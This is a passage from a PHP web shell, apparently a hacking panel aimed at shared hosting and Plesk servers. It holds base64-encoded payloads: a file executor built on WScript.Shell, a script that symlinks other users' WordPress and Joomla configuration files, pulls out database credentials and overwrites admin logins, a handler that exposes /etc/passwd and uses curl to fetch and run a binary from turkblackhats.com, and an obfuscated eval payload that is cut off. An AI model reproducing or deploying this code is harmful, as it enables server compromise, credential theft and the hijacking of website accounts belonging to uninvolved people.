PC9mb250PiZuYnNwOwo8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iRmlsZVBhdGgiIHZhbHVlPSI8
P3BocCBlY2hvIGdldGN3ZCgpOz8+IiBzaXplPSI1NCIgc3R5bGU9ImZvbnQtZmFtaWx5OiBUYWhv
bWE7IGNvbG9yOiAjRkYwMDAwOyBib3JkZXI6IDFweCBkb3R0ZWQgI0ZGMDAwMCIgPiZuYnNwOyZu
YnNwOwo8L2ZvbnQ+CjxwIGFsaWduPSJjZW50ZXIiPjxmb250IGZhY2U9IlRhaG9tYSI+CjxpbnB1
dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIiBzdHlsZT0iZm9udC1mYW1pbHk6IFRhaG9t
YTsgY29sb3I6ICNGRjAwMDA7IGJvcmRlcjogMXB4IGRvdHRlZCAjRkYwMDAwIj48L2ZvbnQ+PC9w
Pgo8cCBhbGlnbj0iY2VudGVyIj4mbmJzcDs8L3A+Cjw/cGhwCiRGaWxlUGF0aCA9ICRfUE9TVFsn
RmlsZVBhdGgnXTsKaWYoaXNzZXQoJEZpbGVQYXRoKSAmJiAoJEZpbGVQYXRoID09IE5VTEwgfHwg
JEZpbGVQYXRoID09ICIiKSkKewplY2hvICc8Y2VudGVyPjx0ZXh0YXJlYSByb3dzPSIxIiBjb2xz
PSIxMDUiIHN0eWxlPSJmb250LWZhbWlseTogVGFob21hOyBjb2xvcjogI0ZGMDAwMDsgYm9yZGVy
OiAxcHggZG90dGVkICNGRjAwMDAiIG5hbWU9IkV4ZWN1dGVkQ29tbWFuZCI+JzsKZWNobydbK10g
RmlsZSBQYXRoIElzIEluIENvcnJlY3QgLCBUcnkgQWdhaW4nOwplY2hvJzwvdGV4dGFyZWE+JzsK
fQplbHNlaWYoaXNzZXQoJEZpbGVQYXRoKSAmJiAhZmlsZV9leGlzdHMoJEZpbGVQYXRoKSkKewpl
Y2hvJzxjZW50ZXI+PHRleHRhcmVhIHJvd3M9IjEiIGNvbHM9IjI4IiBzdHlsZT0iZm9udC1mYW1p
bHk6IFRhaG9tYTsgY29sb3I6ICNGRjAwMDA7IGJvcmRlcjogMXB4IGRvdHRlZCAjRkYwMDAwIiBu
YW1lPSJFeGVjdXRlZENvbW1hbmQiPlsrXSBGaWxlIERvZXMgTm90IEV4aXN0ICE8L3RleHRhcmVh
Pic7CmVjaG8nPC90ZXh0YXJlYT4nOwp9CmVsc2UgaWYoaXNzZXQoJEZpbGVQYXRoKSAmJiBmaWxl
X2V4aXN0cygkRmlsZVBhdGgpKQp7CmVjaG8nPGNlbnRlcj48dGV4dGFyZWEgcm93cz0iOSIgY29s
cz0iMTA1IiBzdHlsZT0iZm9udC1mYW1pbHk6IFRhaG9tYTsgY29sb3I6ICNGRjAwMDA7IGJvcmRl
cjogMXB4IGRvdHRlZCAjRkYwMDAwIiBuYW1lPSJFeGVjdXRlZENvbW1hbmQiPlsrXSBJIEZvdW5k
IFlvdXIgRmlsZSAsIEkgQW0gR29pbmcgVG8gRXhlY3V0ZSBpdCAnOwokV3NoU2hlbGwgPSBuZXcg
Q09NKCJXU2NyaXB0LlNoZWxsIik7IAokRXhlYyA9ICRXc2hTaGVsbC0+UnVuKCRGaWxlUGF0aCwg
NywgZmFsc2UpOyAKZWNobyAiXG5bK10gRXhlY3V0ZWQgU3VjY3NzZnVsbHkgISI7CmVjaG8gIlxu
WytdIFRoZSBFbmQgIjsKZWNobyc8L3RleHRhcmVhPic7Cn0KCn0KPz4KPHAgYWxpZ249ImNlbnRl
ciI+Jm5ic3A7PC9wPgo8cCBhbGlnbj0iY2VudGVyIj4mbmJzcDs8L3A+CjxwIGFsaWduPSJjZW50
ZXIiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNpemU9IjEiPiZuYnNwOyBDcmVhdGVkIEZvcgo8Zm9u
dCBjb2xvcj0iI0ZGMDAwMCI+UGxlc2sgU2VydmVyczwvZm9udD4gfCBDb2RlZCBieSA8Zm9udCBj
b2xvcj0iI0ZGMDAwMCI+CjEzMzdiMHg8L2ZvbnQ+IHwgPGZvbnQgY29sb3I9IiNGRjAwMDAiPlNl
YzRldmVyPC9mb250Pi5jb20gLQo8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+TWFkTGVldHM8L2ZvbnQ+
LmNvbTwvZm9udD48L3A+CjxwIGFsaWduPSJjZW50ZXIiPiZuYnNwOzwvcD4KPHAgYWxpZ249ImNl
bnRlciI+Jm5ic3A7PC9wPgo8cCBhbGlnbj0iY2VudGVyIj4mbmJzcDs8L3A+';

$file = fopen("plesk.php" ,"w+");
$write = fwrite ($file ,base64_decode($ple));
fclose($file);
   echo "<iframe src=plesk/plesk.php width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit27']))
{
    mkdir('pass', 0755);
    chdir('pass');

$pass = 'PHRpdGxlPk1hZGUgSW4gTW9yb2NjbzwvdGl0bGU+CjxzdHlsZSB0eXBlPXRleHQvY3NzPgoJZGl2
I2NvbnRhaW5lcnsKCQl3aWR0aDo5MzFweDsgcG9zaXRpb246cmVsYXRpdmU7IG1hcmdpbi10b3A6
MHB4OyBtYXJnaW4tbGVmdDphdXRvOyBtYXJnaW4tcmlnaHQ6YXV0bzsgdGV4dC1hbGlnbjpsZWZ0
OwoJfWJvZHl7CgkJdGV4dC1hbGlnbjpjZW50ZXI7IG1hcmdpbjowOyBiYWNrZ3JvdW5kLWNvbG9y
OiMwMDAwMDA7IGNvbG9yOiMwMDAwMDA7Cgl9aW5wdXR7CgkJYm9yZGVyOmRhc2hlZCAxcHg7IGJv
cmRlci1jb2xvcjojMzMzOyBCQUNLR1JPVU5ELUNPTE9SOkJsYWNrOyBmb250OjhwdCBWZXJkYW5h
OyBjb2xvcjpSZWQ7Cgl9aW5wdXQ6aG92ZXJ7CgkJYmFja2dyb3VuZDojMWUxZTFlOyBib3JkZXI6
c29saWQgMHB4ICM4NkNDNTA7Cgl9YSB7CgkJY29sb3I6IzUxODQxMzsgdGV4dC1kZWNvcmF0aW9u
Om5vbjsKCX1hOmhvdmVyewoJCWJhY2tncm91bmQ6IzFlMWUxZTsgY29sb3I6I2YwMDsgdGV4dC1k
ZWNvcmF0aW9uOm5vbmU7Cgl9dGV4dGFyZWF7CgkJd2lkdGg6NTAwcHg7IGhlaWdodDoyMzBweDsg
Ym9yZGVyOjFweCAjNDI0MjQyIGRvdHRlZDsgYmFja2dyb3VuZC1jb2xvcjojMTExMTExOyBjb2xv
cjojOTk5OTk5OyBmb250OjlwdCBWZXJkYW5hOyBmb250LWZhbWlseTpDb3VyaWVyCgl9Cjwvc3R5
bGU+CjxiciAvPjxpbWcgc3JjPSdodHRwOi8vaW00NC5ndWxmdXAuY29tL1N5bXhmLnBuZyc+Cjxw
cmU+PGJpZz48Zm9udCBjb2xvcj0ncmVkJz5Kb29tbGEgJiBXb3JkcHJlc3MgU2VydmVyIEluZm8g
Q2hhbmdlcjwvZm9udD48L2JpZz48L3ByZT4KPD9waHAKI0pvb21sYSAmIFdvcmRwcmVzcyBTZXJ2
ZXIgSW5mbyBDaGFuZ2VyCiNCeSBJTkozQ1RPUl9NNAoKQGVycm9yX3JlcG9ydGluZygwKTsKQHNl
dF90aW1lX2xpbWl0KDApOwoKaWYgKGZ1bmN0aW9uX2V4aXN0cyAoJ3N5bWxpbmsnKSBvciBmdW5j
dGlvbl9leGlzdHMgKCdjb3B5JykpewoJaWYgKGlzc2V0ICgkX1BPU1RbJ3VzZXJzJ10pKXsKCQkk
ciA9ICJPcHRpb25zIGFsbCBcbkRpcmVjdG9yeUluZGV4IFN1eC5odG1sXG5BZGRUeXBlIHRleHQv
cGxhaW4gLnBocFxuQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHBcbkFkZFR5cGUgdGV4dC9w
bGFpbiAuaHRtbFxuQWRkSGFuZGxlciB0eHQgLmh0bWxcblJlcXVpcmUgTm9uZVxuU2F0aXNmeSBB
bnkiOwoJCUBta2RpcignbTRfY29uZmlncycsIDA3NTUpOwoJCSRmID0gQGZvcGVuICgnbTRfY29u
Zmlncy8uaHRhY2Nlc3MnLCd3Jykgb3IgZGllKCJVbmFibGUgdG8gb3BlbiBmaWxlISIpOwoJCWZ3
cml0ZSgkZiwgJHIpOwoJCWZjbG9zZSgkZik7CgkJCgkJJHBhc3N3ZCA9IGV4cGxvZGUoIlxuIiwg
JF9QT1NUWyd1c2VycyddKTsKCQlmb3JlYWNoKCRwYXNzd2QgYXMgJHVzZXJzKXsKCQkJJHVzZXJz
ID0gZXhwbG9kZSgnOicsICR1c2Vycyk7CgkJCSR1c2VyID0gJHVzZXJzWzBdOwoJCQkKCQkJJGZ1
bnMgPSBhcnJheSgnc3ltbGluaycsICdjb3B5Jyk7CgkJCWZvcmVhY2goJGZ1bnMgYXMgJGYpewoJ
CQkJaWYgKGZ1bmN0aW9uX2V4aXN0cygkZikpIHsKCQkJCQlAJGYoJy9ob21lLycuJHVzZXIuJy9w
dWJsaWNfaHRtbC93cC1jb25maWcucGhwJywibTRfY29uZmlncy8kdXNlci13cDEzLnR4dCIpOwoJ
CQkJCUAkZignL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCJt
NF9jb25maWdzLyR1c2VyLXdwMTMtd3AudHh0Iik7CgkJCQkJQCRmKCcvaG9tZS8nLiR1c2VyLicv
cHVibGljX2h0bWwvV1Avd3AtY29uZmlnLnBocCcsIm00X2NvbmZpZ3MvJHVzZXItd3AxMy1XUC50
eHQiKTsKCQkJCQlAJGYoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNv
bmZpZy5waHAnLCJtNF9jb25maWdzLyR1c2VyLXdwMTMtd3AtYmV0YS50eHQiKTsKCQkJCQlAJGYo
Jy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCJtNF9jb25m
aWdzLyR1c2VyLXdwMTMtYmV0YS50eHQiKTsKCQkJCQlAJGYoJy9ob21lLycuJHVzZXIuJy9wdWJs
aWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywibTRfY29uZmlncy8kdXNlci13cDEzLXByZXNz
LnR4dCIpOwoJCQkJCUAkZignL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93
cC1jb25maWcucGhwJywibTRfY29uZmlncy8kdXNlci13cDEzLXdvcmRwcmVzcy50eHQiKTsKCQkJ
CQlAJGYoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9Xb3JkcHJlc3Mvd3AtY29uZmlnLnBo
cCcsIm00X2NvbmZpZ3MvJHVzZXItd3AxMy1Xb3JkcHJlc3MudHh0Iik7CgkJCQkJQCRmKCcvaG9t
ZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywibTRfY29uZmlncy8k
dXNlci13cDEzLVdvcmRwcmVzcy50eHQiKTsKCQkJCQlAJGYoJy9ob21lLycuJHVzZXIuJy9wdWJs
aWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywibTRfY29uZmlncy8kdXNlci13
cDEzLXdvcmRwcmVzcy1iZXRhLnR4dCIpOwoJCQkJCUAkZignL2hvbWUvJy4kdXNlci4nL3B1Ymxp
Y19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsIm00X2NvbmZpZ3MvJHVzZXItd3AxMy1uZXdzLnR4
dCIpOwoJCQkJCUAkZignL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcu
cGhwJywibTRfY29uZmlncy8kdXNlci13cDEzLW5ldy50eHQiKTsKCQkJCQlAJGYoJy9ob21lLycu
JHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCJtNF9jb25maWdzLyR1c2Vy
LXdwLWJsb2cudHh0Iik7CgkJCQkJQCRmKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0
YS93cC1jb25maWcucGhwJywibTRfY29uZmlncy8kdXNlci13cC1iZXRhLnR4dCIpOwoJCQkJCUAk
ZignL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCJtNF9j
b25maWdzLyR1c2VyLXdwLWJsb2dzLnR4dCIpOwoJCQkJCUAkZignL2hvbWUvJy4kdXNlci4nL3B1
YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIm00X2NvbmZpZ3MvJHVzZXItd3AtaG9tZS50
eHQiKTsKCQkJCQlAJGYoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29u
ZmlnLnBocCcsIm00X2NvbmZpZ3MvJHVzZXItd3AtcHJvdGFsLnR4dCIpOwoJCQkJCUAkZignL2hv
bWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsIm00X2NvbmZpZ3Mv
JHVzZXItd3Atc2l0ZS50eHQiKTsKCQkJCQlAJGYoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRt
bC9tYWluL3dwLWNvbmZpZy5waHAnLCJtNF9jb25maWdzLyR1c2VyLXdwLW1haW4udHh0Iik7CgkJ
CQkJQCRmKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdGVzdC93cC1jb25maWcucGhwJywi
bTRfY29uZmlncy8kdXNlci13cC10ZXN0LnR4dCIpOwoJCQkJCUAkZignL2hvbWUvJy4kdXNlci4n
L3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsIm00X2NvbmZpZ3MvJHVzZXItam9v
LnR4dCIpOwoJCQkJCUAkZignL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Ntcy9jb25maWd1
cmF0aW9uLnBocCcsIm00X2NvbmZpZ3MvJHVzZXItam9vbWxhLWNtcy50eHQiKTsKCQkJCQlAJGYo
Jy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywibTRf
Y29uZmlncy8kdXNlci1qb29tbGEtc2l0ZS50eHQiKTsKCQkJCQlAJGYoJy9ob21lLycuJHVzZXIu
Jy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywibTRfY29uZmlncy8kdXNlci1q
b29tbGEtbWFpbi50eHQiKTsKCQkJCQlAJGYoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9u
ZXdzL2NvbmZpZ3VyYXRpb24ucGhwJywibTRfY29uZmlncy8kdXNlci1qb29tbGEtbmV3cy50eHQi
KTsKCQkJCQlAJGYoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlv
bi5waHAnLCJtNF9jb25maWdzLyR1c2VyLWpvb21sYS1uZXcudHh0Iik7CgkJCQkJQCRmKCcvaG9t
ZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsIm00X2NvbmZp
Z3MvJHVzZXItam9vbWxhLWhvbWUudHh0Iik7CgkJCQkJQCRmKCcvaG9tZS8nLiR1c2VyLicvcHVi
bGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCJtNF9jb25maWdzLyR1c2VyLWpvb21sYS50eHQi
KTsKCQkJCQlicmVhazsKCQkJCX0KCQkJfQoJCX0KCQkkdXJsID0gZ2V0X2NvbmZpZ3NfcGF0aCgp
OwoJCSRkYXRhID0gR2V0X1NvdXJjZSAoJHVybCwiTW96aWxsYS81LjAgKFdpbmRvd3M7IFU7IFdp
bmRvd3MgTlQgNi4xOyBlbi1VUzsgcnY6MS45LjIuMykgR2Vja28vMjAxMDA0MDEgRmlyZWZveC8z
LjYuMyIpOwoJCXByZWdfbWF0Y2hfYWxsKCcjaHJlZj0iKC4qPykiPiMnLCAkZGF0YSwgJG1hdGNo
ZXMpOwoJCSRjb25maWdzID0gYXJyYXlfdW5pcXVlKCRtYXRjaGVzWzFdKTsKCQlmb3JlYWNoKCRj
b25maWdzIGFzICRjb25maWcpewoJCQkkdXNlciA9IGV4cGxvZGUoJy0nLCAkY29uZmlnKTsKCQkJ
ZWNobyAiPHByZT48Zm9udCBjb2xvcj13aGl0ZT4gVGhlIFVybCA6IDxhIGhyZWY9J2h0dHA6Ly8i
LmdldGhvc3RieW5hbWUoJF9TRVJWRVJbIkhUVFBfSE9TVCJdKS4iL34iLiR1c2VyWzBdLiInIHRh
cmdldD0nX2JsYW5rJz5odHRwOi8vIi5nZXRob3N0YnluYW1lKCRfU0VSVkVSWyJIVFRQX0hPU1Qi
XSkuIi9+Ii4kdXNlclswXS4iPC9hPjwvZm9udD4iOwoJCQkKCQkJJGRhdGEgPSBHZXRfU291cmNl
ICgkdXJsLiRjb25maWcsIk1vemlsbGEvNS4wIChXaW5kb3dzOyBVOyBXaW5kb3dzIE5UIDYuMTsg
ZW4tVVM7IHJ2OjEuOS4yLjMpIEdlY2tvLzIwMTAwNDAxIEZpcmVmb3gvMy42LjMiKTsKCQkJaWYg
KHByZWdfbWF0Y2ggKCIjREJfVVNFUiNpIiwgJGRhdGEpKXsKCQkJCXByZWdfbWF0Y2ggKCIjJ0RC
X0hPU1QnLCAnKC4qPyknI2kiLCAkZGF0YSwgJERCX0hPU1QpOwoJCQkJcHJlZ19tYXRjaCAoIiMn
REJfVVNFUicsICcoLio/KScjaSIsICRkYXRhLCAkREJfVVNFUik7CgkJCQlwcmVnX21hdGNoICgi
IydEQl9QQVNTV09SRCcsICcoLio/KScjaSIsICRkYXRhLCAkREJfUEFTU1dPUkQpOwoJCQkJcHJl
Z19tYXRjaCAoIiMnREJfTkFNRScsICcoLio/KScjaSIsICRkYXRhLCAkREJfTkFNRSk7CgkJCQkK
CQkJCSRjb24gPSBAbXlzcWxfY29ubmVjdCgkREJfSE9TVFsxXSwkREJfVVNFUlsxXSwkREJfUEFT
U1dPUkRbMV0pOwoJCQkJaWYoJGNvbil7CgkJCQkJJGRiX3NlbGVjdGVkID0gQG15c3FsX3NlbGVj
dF9kYigkREJfTkFNRVsxXSwgJGNvbik7CgkJCQkJaWYoJGRiX3NlbGVjdGVkKXsKCQkJCQkJJHEg
PSBAbXlzcWxfcXVlcnkoIlVQREFURSBgd3BfdXNlcnNgIFNFVCBgdXNlcl9sb2dpbmAgPSdpbmoz
Y3Rvcl9tNCcgV0hFUkUgSUQgPSAxIik7CgkJCQkJCSRxID0gQG15c3FsX3F1ZXJ5KCJVUERBVEUg
YHdwX3VzZXJzYCBTRVQgYHVzZXJfcGFzc2AgPSdmZDZiNmZjOTIyMGI3MmQyMTY4M2FlOGU0ZjUw
YTIxMCcgV0hFUkUgSUQgPSAxIik7CgkJCQkJCWlmKCRxKXsKCQkJCQkJCWVjaG8gJyA8Zm9udCBj
b2xvcj1ncmVlbj4oTmV3IFVzZXI6IGluajNjdG9yX200LCBOZXcgUGFzc3dvcmQ6IG00KTwvZm9u
dD48L3ByZT4nOwoJCQkJCQl9ZWxzZXsKCQkJCQkJCWVjaG8gJyA8Zm9udCBjb2xvcj1yZWQ+KEVS
Uk9SKTwvZm9udD48L3ByZT4nOwoJCQkJCQl9CgkJCQkJfWVsc2V7CgkJCQkJCWVjaG8gIiA8Zm9u
dCBjb2xvcj1yZWQ+KENhbid0IFNlbGVjdCBUaGUgRGF0YWJhc2UpPC9mb250PjwvcHJlPiI7CgkJ
CQkJfQoJCQkJfWVsc2V7CgkJCQkJZWNobyAnPGI+IDxmb250IGNvbG9yPXJlZD4oQ291bGQgbm90
IGNvbm5lY3QpPC9mb250PjwvcHJlPic7CgkJCQl9CgkJCX1lbHNlaWYgKHByZWdfbWF0Y2ggKCIj
Y2xhc3MgSkNvbmZpZyNpIiwgJGRhdGEpKXsKCQkJCXByZWdfbWF0Y2ggKCIjaG9zdCA9ICcoLio/
KScjaSIsICRkYXRhLCAkREJfSE9TVCk7CgkJCQlwcmVnX21hdGNoICgiI3VzZXIgPSAnKC4qPykn
I2kiLCAkZGF0YSwgJERCX1VTRVIpOwoJCQkJcHJlZ19tYXRjaCAoIiNwYXNzd29yZCA9ICcoLio/
KScjaSIsICRkYXRhLCAkREJfUEFTU1dPUkQpOwoJCQkJcHJlZ19tYXRjaCAoIiNkYiA9ICcoLio/
KScjaSIsICRkYXRhLCAkREJfTkFNRSk7CgkJCQkKCQkJCSRjb24gPSBAbXlzcWxfY29ubmVjdCgk
REJfSE9TVFsxXSwkREJfVVNFUlsxXSwkREJfUEFTU1dPUkRbMV0pOwoJCQkJaWYoJGNvbil7CgkJ
CQkJJGRiX3NlbGVjdGVkID0gQG15c3FsX3NlbGVjdF9kYigkREJfTkFNRVsxXSwgJGNvbik7CgkJ
CQkJaWYoJGRiX3NlbGVjdGVkKXsKCQkJCQkJJHEgPSBAbXlzcWxfcXVlcnkoIlVQREFURSBgam9z
X3VzZXJzYCBTRVQgYHVzZXJuYW1lYCA9J2luajNjdG9yX200JyBXSEVSRSBJRCA9IDYyIik7CgkJ
CQkJCSRxID0gQG15c3FsX3F1ZXJ5KCJVUERBVEUgYGpvc191c2Vyc2AgU0VUIGBwYXNzd29yZGAg
PSdmZDZiNmZjOTIyMGI3MmQyMTY4M2FlOGU0ZjUwYTIxMCcgV0hFUkUgSUQgPSA2MiIpOwoJCQkJ
CQlpZigkcSl7CgkJCQkJCQllY2hvICcgPGZvbnQgY29sb3I9Z3JlZW4+KE5ldyBVc2VyOiBpbmoz
Y3Rvcl9tNCwgTmV3IFBhc3N3b3JkOiBtNCk8L2ZvbnQ+PC9wcmU+JzsKCQkJCQkJfWVsc2V7CgkJ
CQkJCQllY2hvICcgPGZvbnQgY29sb3I9cmVkPihFUlJPUik8L2ZvbnQ+PC9wcmU+JzsKCQkJCQkJ
fQoJCQkJCX1lbHNlewoJCQkJCQllY2hvICIgPGZvbnQgY29sb3I9cmVkPihDYW4ndCBTZWxlY3Qg
VGhlIERhdGFiYXNlKTwvZm9udD48L3ByZT4iOwoJCQkJCX0KCQkJCX1lbHNlewoJCQkJCWVjaG8g
JyA8Zm9udCBjb2xvcj1yZWQ+KENvdWxkIG5vdCBjb25uZWN0KTwvZm9udD48L3ByZT4nOwoJCQkJ
fQoJCQl9CgkJfQoJfWVsc2V7CgkJZWNobyc8Zm9ybSBtZXRob2Q9UE9TVCAvPgoJCTx0ZXh0YXJl
YSByb3dzPTMwIGNvbHM9MTI1IG5hbWU9dXNlcnMgcGxhY2Vob2xkZXI9IlB1dCAvZXRjL3Bhc3N3
ZCBWYWx1ZSBIZXJlIj48L3RleHRhcmVhPjxiciAvPjxiciAvPgoJCTxpbnB1dCB0eXBlPXN1Ym1p
dCB2YWx1ZT1TVEFSVCAvPgoJCTxiciAvPic7Cgl9Cn0KCmZ1bmN0aW9uIGdldF9jb25maWdzX3Bh
dGgoKXsKCSRmdWxsX3VybF9wYXRoID0gImh0dHA6Ly8kX1NFUlZFUltIVFRQX0hPU1RdJF9TRVJW
RVJbUkVRVUVTVF9VUkldIjsKCSRwYXJzZSA9IHBhdGhpbmZvICgkZnVsbF91cmxfcGF0aCk7Cgkk
Y29uZmlnc19wYXRoID0gJHBhcnNlWydkaXJuYW1lJ10uJy9tNF9jb25maWdzLyc7CglyZXR1cm4g
JGNvbmZpZ3NfcGF0aDsKfQoKZnVuY3Rpb24gR2V0X1NvdXJjZSAoJHVybCwgJHVzZXJfYWdlbnQp
ewoJJGNoID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1VSTCwgJHVy
bCk7CgljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJfYWdlbnQpOwoJ
Y3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9TU0xfVkVSSUZZSE9TVCwgMCk7CgljdXJsX3NldG9w
dCAoJGNoLCBDVVJMT1BUX1NTTF9WRVJJRllQRUVSLCAwKTsKCWN1cmxfc2V0b3B0ICgkY2gsIENV
UkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwoJY3VybF9zZXRvcHQgKCRjaCwgQ1VSTE9QVF9GT0xM
T1dMT0NBVElPTiwgMSk7CgljdXJsX3NldG9wdCAoJGNoLCBDVVJMT1BUX0VOQ09ESU5HLCAiZ3pp
cCwgZGVmbGF0ZSwgY29tcHJlc3MiKTsKCWN1cmxfc2V0b3B0ICgkY2gsIENVUkxPUFRfRlJFU0hf
Q09OTkVDVCwgMSk7Cgkkc291cmNlID0gY3VybF9leGVjKCRjaCk7CiAgICBjdXJsX2Nsb3NlKCRj
aCk7CgkKICAgIHJldHVybiAkc291cmNlOwp9Cgo/Pgo8YnIgLz48cHJlPjxmb250IGNvbG9yPXJl
ZD5DMGQzZCAzeSA8YSBocmVmPWh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9INGNrMTkgdGFyZ2V0
PV9ibGFuaz5JTkozQ1RPUl9NNDwvYT48L2ZvbnQ+PC9wcmU+PC9wPg==';

$file = fopen("pass.php" ,"w+");
$write = fwrite ($file ,base64_decode($pass));
fclose($file);
   echo "<iframe src=pass/pass.php width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit28']))
{
    mkdir('p88', 0755);
    chdir('p88');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya açýlamadý!");
        $metin = "DirectoryIndex sea.txt
HeaderName sea.txt
ReadmeName sea.txt
footerName sea.txt
ErrorDocument 404 /404.html
404.html = Symlinked sea.txt
Options all
ForceType text/plain
AddType text/plain .php
AddType text/plain .html
AddHandler server-parsed .php
AddHandler txt .php";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
@exec('ln -s /etc/passwd sea.txt');
@exec('curl http://turkblackhats.com/priv/ln.zip -o ln.zip');
@exec('unzip ln.zip');
@exec('chmod 755 ln');
@exec('./ln -s /etc/passwd sea.txt');
   echo "<iframe src=p88/sea.txt width=100% height=100% frameborder=0></iframe> ";
}
if (isset($_POST['Submit29']))
{
    mkdir('pyb', 0755);
    chdir('pyb');

$pac = 'PD9waHAKZXZhbCgiXHg2NVx4NzZceDYxXHg2Q1x4MjhceDY3XHg3QVx4NjlceDZFXHg2Nlx4NkNc
eDYxXHg3NFx4NjVceDI4XHg2Mlx4NjFceDczXHg2NVx4MzZceDM0XHg1Rlx4NjRceDY1XHg2M1x4
NkZceDY0XHg2NVx4MjgnVFZhM0RzUUtFZndYR2tBdW5KTVFoWE1PNTJ6ck5jNDVoN1A5OVJ3OEpD
aEdvNTJaN1VhckxhOTArTnRmL3JnSi9JK2JKSDRNLzhEOWNTUFVqOG1meHZ5WS9rSDRnZmpUKzNl
R3hQN2MrVThPK2ErRy9xbWh2eHo2ODNIeE4vODNSL3piKzc4Wm9mNTZCeUhLbjdja1hOOUk5VmFX
aWFxRkt3V3VuUFI1bUhEMVVyeXlmTWdDUmc3WXd4aGYwNEhhdDlwVjJwOGFpbEdWSmp2eWZTalFx
M1V3VDNSaHdPa3E1Mm1yc2VjSEtNSllwODJLRTZtUFRVS2c4WGdJUmIxZ3ZqZVZkQzNlaDZSdzJy
bzZiS3NBRGFvb29rSTZaMjJxS2R6UlNkbUZBeUxJN21CUGc0NW1oRktvenNxR01uaEozN1ByTjB6
Y0hYdFhCSHVxWFJZKytZeVdtdnpzNzBQdyszS2xCSmhrN2JBZ29yZDJ4SDcycEFOUU9YUHRRN2dL
TWZHeEdOcDE3K0FxVng0Q3hEM1Q5QkplZFNOQ3lublpIL1JpV1VtdFhnMitpL08rdHhFK1d6WWNX
dWhxTHBJR0lxZ0QrY1NqOGF5cUtKQ3VWdXhWUHRWMDlISTlTQmUzNFIvY3dNR0JNclg1WVc3TEhH
bExqSEZDdHc5SnJWdGRhd2NzOEdESVdZTGgrc3htSTZ6VnNqRmM3S3IrTXloeXhITmNrTStTUG9B
blAzT2NKYTIxVzQrV2UvWGo4YkZxeUVFRnNkeXRhNW1UaG55Q3FtZGdtM2szRmtneFd2bTBFVTA2
TWZZNXJZNXN6cytYbyttdVNNbDYxa2ZXUEZuczJQT2NFV0E4YVcrY2haQW5mYkZnbnRQSEdiUVVs
YWphem1Ha2N4L3REbVdZSnUyS2ZSQ09YNzhlTGE4SlAwaEx6VGlmVmdoWFVWWjRqUm5QblVtTEIr
ZzFtZzZWcGlCb3pyRng4dmlreW03ZkEva1ZybWpQOW9taXg1cHp4UTdLRnNmSGZFQ0xESDh1cDhp
eVFOWE9kTVJlMkVnMWRWZllrRjlqUEFNUVRDa3MyQnBNRStqYzFucG0xaTZLWmxUU29SWi96TTJO
dENxeG5RYis5SE9oN0FZc3BVWUFMeFpsQjFhdXl5MENIdkZna2NaSHFvbGRiUEZBZVVDV3Z6STBD
MXY2bkw1SU9XZ1dwMis4WHlGK0VJaDA4YTRMeUdDenFkaVFyQ3pkSUtEYUVlVjZkcDhGZTNtekxi
WlJNaWgyM3QybFFBYWpKeE05cjVjeXJDbTBuTkRWbHNXZUhjdVd2UmQrbUJxa2NGdzdUemVDcE00
NGFKUVlSQmcxUnlmdnVpTWgxWEl1QjRoMHpiNDJ6KzIyNGwrVThOSjZIcG9yS01OdXo2UzI5S2Ew
MUtoaUx3VXVvVFZTVjZkcjZ4YWF0UGdHSE1qZi9heFFmc05GL2VRYUR0bWVvWVpKMFpFcCtwTk1Z
